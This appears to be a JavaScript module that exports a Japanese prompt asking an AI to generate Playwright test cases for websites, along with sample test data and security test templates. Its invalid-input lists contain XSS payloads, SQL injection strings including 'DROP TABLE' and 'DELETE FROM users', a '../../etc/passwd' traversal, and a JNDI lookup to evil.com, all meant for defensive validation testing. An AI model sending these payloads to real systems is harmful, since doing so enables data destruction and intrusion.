// AI用の詳細なテストケース生成プロンプト

export const TEST_GENERATION_PROMPT = `
【Playwright自動テストケース生成指示】

Webサイトを上から順番に解析し、各要素に対して網羅的なテストケースを作成してください。

解析順序：
- ページ最上部から最下部まで順番に解析
- 同じ高さの要素は左から右の順で処理
- ネストされた要素は親要素から子要素の順で解析

テスト対象要素：
1. リンク（内部リンク、外部リンク、アンカーリンク）
2. 入力項目（テキスト、メール、パスワード、テキストエリア、セレクトボックス、ラジオボタン、チェックボックス）
3. ボタン（送信ボタン、リセットボタン、通常のボタン）
4. その他のインタラクティブ要素（タブ、アコーディオン、モーダル、ドロップダウンメニュー）

各要素のテストケース作成：

【リンクのテスト】
正常系：
- リンクの存在確認とクリック可能性
- 正しいURLへの遷移
- 新規タブで開く場合の動作
- アンカーリンクの正しいスクロール位置

異常系：
- 404エラーページの処理
- ネットワークエラー時の挙動
- アクセス権限がない場合の制御

【入力項目のテスト】
正常系：
- 有効な値の入力と送信成功
- 最大文字数以内の入力
- 必須項目への有効な入力
- 許可された特殊文字の入力

異常系：
- 空欄での送信
- 最大文字数超過
- 無効な形式（メールアドレス、電話番号、日付等）
- XSS攻撃文字列（<script>alert('XSS')</script>等）の入力
- SQLインジェクション文字列（' OR '1'='1等）の入力
- 全角半角の不正な組み合わせ
- 制御文字や改行コードの入力

【ボタンのテスト】
正常系：
- クリック時の期待される動作
- ダブルクリック防止機能
- Enterキーでの実行
- フォーカス時の適切な表示

異常系：
- 無効化状態でのクリック
- 連続クリックの処理
- 処理中の再クリック防止
- タイムアウト時の処理

【セレクトボックス/ラジオボタン/チェックボックスのテスト】
正常系：
- 各選択肢の選択と値の確認
- デフォルト値の確認
- 複数選択（チェックボックス）の動作
- グループ内の排他制御（ラジオボタン）

異常系：
- 無効な選択肢の指定
- プログラムによる不正な値の設定
- 必須選択項目の未選択

【フォーム全体のテスト】
正常系：
- すべての必須項目を正しく入力して送信
- オプション項目の有無による動作確認
- フォームのリセット機能

異常系：
- 必須項目の未入力
- 複数項目の組み合わせバリデーション
- CSRFトークンの確認
- セッションタイムアウト時の処理

特別な考慮事項：
- Ajax通信の完了待機
- 動的に生成される要素の検出
- レスポンシブデザインでの表示確認
- キーボードナビゲーション
- アクセシビリティの確認
- エラーメッセージの適切な表示
- バリデーションメッセージの確認
- ローディング中の二重送信防止

テストケース出力形式：
各テストケースは以下の形式でJSONとして出力してください：
{
  "testName": "テストケース名",
  "category": "カテゴリ（リンク/入力/ボタン/フォーム/セキュリティ）",
  "type": "normal/error/security",
  "priority": "high/medium/low",
  "selector": "要素のセレクタ",
  "action": "click/fill/select/check等",
  "testData": "入力値や期待値",
  "expectedResult": "期待される結果",
  "steps": ["手順1", "手順2", "手順3"]
}

必ず正常系と異常系の両方のテストケースを作成し、特にセキュリティに関するテストケースも含めてください。
`;

// テスト用のサンプルデータ
export const TEST_DATA = {
  // 正常系テストデータ
  valid: {
    email: ['test@example.com', 'user@domain.co.jp', 'admin+test@company.org'],
    password: ['Password123!', 'SecureP@ss2024', 'Complex!Pass#456'],
    phone: ['090-1234-5678', '03-1234-5678', '+81-90-1234-5678'],
    name: ['山田太郎', 'Taro Yamada', 'やまだ たろう'],
    address: ['東京都渋谷区1-2-3', '〒150-0001 東京都渋谷区神宮前1-2-3 ビル名101'],
    url: ['https://example.com', 'http://localhost:3000', 'https://sub.domain.co.jp/path'],
    date: ['2024-01-01', '2024/12/31', '2024-06-15'],
    number: ['0', '1', '100', '9999', '-1', '3.14'],
    text: ['通常のテキスト', '日本語のテスト', 'English text', '123456789']
  },
  
  // 異常系テストデータ
  invalid: {
    email: ['invalid', '@example.com', 'test@', 'test..test@example.com', 'test@.com'],
    password: ['123', 'password', ' ', '　', ''],
    phone: ['123', 'abc-defg-hijk', '000-0000-0000'],
    xss: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<svg onload=alert("XSS")>',
      '<body onload=alert("XSS")>'
    ],
    sql: [
      '\' OR \'1\'=\'1',
      '1; DROP TABLE users--',
      'admin\'--',
      '\' OR 1=1--',
      '1\' AND \'1\' = \'1',
      '\'; DELETE FROM users; --',
      '1 UNION SELECT * FROM users--'
    ],
    special: [
      '../../etc/passwd',
      'C:\\Windows\\System32\\',
      '%00',
      '\r\n',
      '\u0000',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}'
    ],
    oversized: [
      'あ'.repeat(10001),  // 10001文字
      'a'.repeat(100001),  // 100001文字
      '漢字'.repeat(5001)  // 10002バイト
    ]
  },
  
  // 境界値テストデータ
  boundary: {
    maxLength: {
      10: 'a'.repeat(10),
      50: 'a'.repeat(50),
      100: 'a'.repeat(100),
      255: 'a'.repeat(255),
      1000: 'a'.repeat(1000)
    },
    numbers: {
      min: -2147483648,
      max: 2147483647,
      zero: 0,
      negative: -1,
      decimal: 3.141592653589793
    }
  }
};

// セキュリティテストケースのテンプレート
export const SECURITY_TEST_TEMPLATES = [
  {
    name: 'XSS攻撃防御テスト',
    category: 'セキュリティ',
    tests: TEST_DATA.invalid.xss.map(payload => ({
      input: payload,
      expected: 'スクリプトが実行されない、またはエスケープされて表示される'
    }))
  },
  {
    name: 'SQLインジェクション防御テスト',
    category: 'セキュリティ',
    tests: TEST_DATA.invalid.sql.map(payload => ({
      input: payload,
      expected: 'SQLエラーが発生しない、または適切にエスケープされる'
    }))
  },
  {
    name: 'ディレクトリトラバーサル防御テスト',
    category: 'セキュリティ',
    tests: [
      { input: '../../etc/passwd', expected: 'ファイルアクセスが拒否される' },
      { input: '..\\..\\windows\\system32', expected: 'ファイルアクセスが拒否される' }
    ]
  },
  {
    name: 'CSRF防御テスト',
    category: 'セキュリティ',
    tests: [
      { test: 'CSRFトークンなしでのPOST', expected: 'リクエストが拒否される' },
      { test: '無効なCSRFトークンでのPOST', expected: 'リクエストが拒否される' }
    ]
  }
];

export default {
  TEST_GENERATION_PROMPT,
  TEST_DATA,
  SECURITY_TEST_TEMPLATES
};